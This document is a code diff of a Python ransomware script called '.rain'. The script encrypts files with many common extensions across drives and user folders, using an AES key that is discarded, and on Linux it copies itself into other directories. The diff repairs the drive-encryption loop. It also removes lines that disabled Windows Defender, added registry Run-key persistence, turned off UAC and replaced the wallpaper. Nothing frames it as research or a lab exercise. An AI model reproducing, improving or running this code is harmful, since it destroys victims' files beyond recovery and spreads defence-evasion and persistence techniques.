@@ -1,8 +1,4 @@
 try:
-	import requests
-except:
-	pass
-try:
 	import os
 	import shutil
 	from os import getenv,system
@@ -12,8 +8,8 @@ try:
 	import platform
 	from shutil import copyfile
 	import string
-except Exception as e:
-	print('An error ocurred.',e)
+	import sys
+except:
 	exit()
 
 def crypt(file):
@@ -24,13 +20,14 @@ def crypt(file):
 	cifile = open(file,'wb')
 	cifile.write(cifdata)
 	cifile.close()
-	os.rename(file,file+'.rain')
+	ne = os.path.splitext(file)[0]
+	os.rename(file,ne+".rain")
 
 BLOCK_SIZE = 32
 k = Random.new().read(BLOCK_SIZE)
 aes = AES.new(k, AES.MODE_ECB)
 drives = list(string.ascii_uppercase)
-file_name = os.path.basename(sys.argv[0])
+drives.remove("C")
 ext=['*.txt','*.lnk','*.application','*.veg','*.doc','*.pdf','*.jpg','*.gif','*.png','*.bitmap'
 ,'*.mp4','*.avi','*.zip','*.wav','*.svg','*.mdb','*.rar','*.tar','*.xf','*.gz'
 ,'*.sqlite3','*.mov','*.pptx','*.pptm','*.xlsx','*.xlsm','*.aes','*.accdb','*.bmp'
@@ -45,40 +42,27 @@ sys = platform.system()
 
 def infectall():
 	if sys=="Windows":
-		try:
-			i = i+":/"
-			os.chdir(i)
-			for e in ext:
-				try:
-					files = glob.iglob(i+"**/"+(ext),recursive=True)
-				except:
-					pass
-				for file in files:
+		for i in drives:
+			try:
+				i = i+":/"
+				os.chdir(i)
+				for e in ext:
 					try:
-						crypt(file)
+						files = glob.iglob(i+"**/"+(e),recursive=True)
 					except:
 						pass
+					for file in files:
+						try:
+							crypt(file)
+						except:
+							pass
+			except:
+				pass
 	elif sys=="Linux":
 		exit()
 
 if sys=='Windows':
 	try:
-		bat3 = open('C:/Users/Public/wd.bat','w')
-		bat3.write('Set-MpPreference -DisableRealtimeMonitoring $ true')
-		bat3.close()
-		
-		os.startfile('C:/Users/Public/wd.bat')
-		shutil.copy(file_name,'C:/Users/Public/')
-		bat = open('C:/Users/Public/prst.bat','w')
-		bat.write('reg.exe add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "tskname" /t REG_SZ /d "C:\\Users\\Public\\globancy.exe" /f')
-		bat.close()
-		os.startfile('C:/Users/Public/prst.bat')
-
-		bat2 = open('C:/Users/Public/uac.bat','w')
-		bat2.write('reg.exe add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f')
-		bat2.close()
-		os.startfile('C:/Users/Public/uac.bat')
-
 		desktop = os.path.expanduser('~/Desktop')
 		documents = os.path.expanduser('~/Documents')
 		downloads = os.path.expanduser('~/Downloads')
@@ -127,26 +111,7 @@ if sys=='Windows':
 				crypt(file)
 			except:
 				pass
-
-	url='https://i.redd.it/owhz3xmb7a311.jpg'
-	try:
-		try:
-			r = requests.get(url)
-		except:
-			pass
-		img = open('C:/Users/Public/rimg.jpg','wb')
-		img.write(r.content)
-		img.close()
-		img = 'C:/Users/Public/rimg.jpg'
-		dst = appdt+'/Microsoft/Windows/Themes/'
-		os.chdir(dst)
-		copyfile('TranscodedWallpaper','C:/Users/Public/transold')
-		copyfile(img,dst+'TranscodedWallpaper')
-		system('taskkill /f /im explorer.exe')
-		system('C:\\Windows\\explorer.exe')
-	except:
-		pass
-
+				
 	infectall()
 elif sys=='Linux':
 	desktop = os.path.expanduser('~/Desktop')
@@ -157,9 +122,9 @@ elif sys=='Linux':
 	root = os.path.expanduser('/')
 	
 	try:
-		shutil.copy(file_name,documents)
-		shutil.copy(file_name,documentos)
-		shutil.copy(file_name,root)
+		shutil.copy(__file__,documents)
+		shutil.copy(__file__,documentos)
+		shutil.copy(__file__,root)
 	except:
 		pass
 	try:
@@ -193,6 +158,7 @@ elif sys=='Linux':
 	try:
 		os.chdir(documents)
 	except:
+		pass
 	try:
 		os.chdir(documentos)
 	except:
